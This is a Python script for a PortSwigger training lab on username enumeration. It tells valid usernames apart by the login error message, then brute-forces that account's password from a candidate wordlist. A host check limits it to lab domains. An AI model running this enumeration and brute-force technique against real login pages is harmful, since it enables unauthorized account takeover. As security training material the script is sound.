"""Educational helper for PortSwigger's "Username enumeration via different responses" lab.

Only runs against a lab host under *.web-security-academy.net.
Install dependency: python3 -m pip install requests
"""

from pathlib import Path
from time import sleep
from urllib.parse import urlparse, urljoin
import sys

import requests

# Replace this with your own active PortSwigger lab URL (the origin, not /login).
LAB_URL = "YOUR LAB URL"
USERNAME_WORDLIST = "usernames.txt"
PASSWORD_WORDLIST = "passwords.txt"
DELAY_SECONDS = 0.15
DUMMY_PASSWORD = "Password123"


def load_wordlist(filename: str) -> list[str]:
    path = Path(filename)
    if not path.is_file():
        raise FileNotFoundError(
            f"Wordlist not found: {path}\n"
            "Download the Candidate usernames and Candidate passwords files from your lab page, "
            "then save them using the filenames configured near the top of this script."
        )
    values = [line.strip() for line in path.read_text(encoding="utf-8", errors="replace").splitlines()]
    return [value for value in values if value and not value.startswith("#")]


def validate_lab_url(base_url: str) -> str:
    parsed = urlparse(base_url)
    host = (parsed.hostname or "").lower()
    if parsed.scheme != "https" or not host.endswith(".web-security-academy.net"):
        raise ValueError(
            "Safety check failed. Set LAB_URL to your active HTTPS PortSwigger lab URL, "
            "whose hostname ends with .web-security-academy.net."
        )
    return urljoin(base_url.rstrip("/") + "/", "login")


def main() -> int:
    try:
        login_url = validate_lab_url(LAB_URL)
        usernames = load_wordlist(USERNAME_WORDLIST)
        passwords = load_wordlist(PASSWORD_WORDLIST)
    except (ValueError, FileNotFoundError) as exc:
        print(f"[!] {exc}")
        return 2

    if not usernames or not passwords:
        print("[!] One of the wordlists is empty.")
        return 2

    session = requests.Session()
    session.headers.update({"User-Agent": "PortSwigger-Lab-Learning-Script/1.0"})

    try:
        # Load the lab first so the session receives any initial cookies.
        initial = session.get(LAB_URL.rstrip("/") + "/", timeout=15)
        initial.raise_for_status()
    except requests.RequestException as exc:
        print(f"[!] Could not open the lab: {exc}")
        return 1

    print(f"[*] Lab page loaded. Testing {len(usernames)} candidate usernames...")
    valid_username = None

    # Stage 1: keep the password fixed; vary only the username.
    for index, username in enumerate(usernames, start=1):
        try:
            response = session.post(
                login_url,
                data={"username": username, "password": DUMMY_PASSWORD},
                allow_redirects=False,
                timeout=15,
            )
        except requests.RequestException as exc:
            print(f"[!] Request failed for a username candidate: {exc}")
            return 1

        if response.status_code == 429:
            print("[!] Server returned HTTP 429 (rate limited). Stop and wait before trying again.")
            return 1

        body = response.text.casefold()
        if "incorrect password" in body:
            valid_username = username
            print(f"[+] Possible valid username found: {valid_username!r}")
            break
        elif "invalid username" in body:
            pass  # Expected response for an unrecognized username.
        else:
            excerpt = " ".join(response.text.split())[:180]
            print(
                "[!] Response did not match the lab's expected error messages. "
                f"HTTP {response.status_code}; sample: {excerpt!r}\n"
                "    Check that LAB_URL is the correct active lab and that the response wording matches."
            )
            return 1

        if index % 100 == 0:
            print(f"    Checked {index}/{len(usernames)} usernames...")
        sleep(DELAY_SECONDS)

    if valid_username is None:
        print("[-] No valid username detected in this wordlist.")
        return 1

    print(f"[*] Testing {len(passwords)} candidate passwords for {valid_username!r}...")

    # Stage 2: keep the username fixed; vary only the password.
    for index, password in enumerate(passwords, start=1):
        try:
            response = session.post(
                login_url,
                data={"username": valid_username, "password": password},
                allow_redirects=False,
                timeout=15,
            )
        except requests.RequestException as exc:
            print(f"[!] Request failed while testing passwords: {exc}")
            return 1

        if response.status_code == 429:
            print("[!] Server returned HTTP 429 (rate limited). Stop and wait before trying again.")
            return 1

        location = response.headers.get("Location", "")
        body = response.text.casefold()
        if response.status_code in (302, 303) and "my-account" in location.casefold():
            print("\n[+] Login appears successful!")
            print(f"    Username: {valid_username}")
            print(f"    Password: {password}")
            print(f"    HTTP status: {response.status_code}")
            print(f"    Redirect: {location}")
            return 0

        # This lab normally returns an error page for incorrect passwords.
        if "incorrect password" not in body and "invalid username" not in body:
            excerpt = " ".join(response.text.split())[:180]
            print(
                "[!] Unexpected response while testing passwords: "
                f"HTTP {response.status_code}; Location={location!r}; sample={excerpt!r}\n"
                "    The lab may have changed its response behavior; inspect the request in Burp Suite."
            )
            return 1

        if index % 100 == 0:
            print(f"    Checked {index}/{len(passwords)} passwords...")
        sleep(DELAY_SECONDS)

    print("[-] No successful password found in this wordlist.")
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        raise SystemExit(130)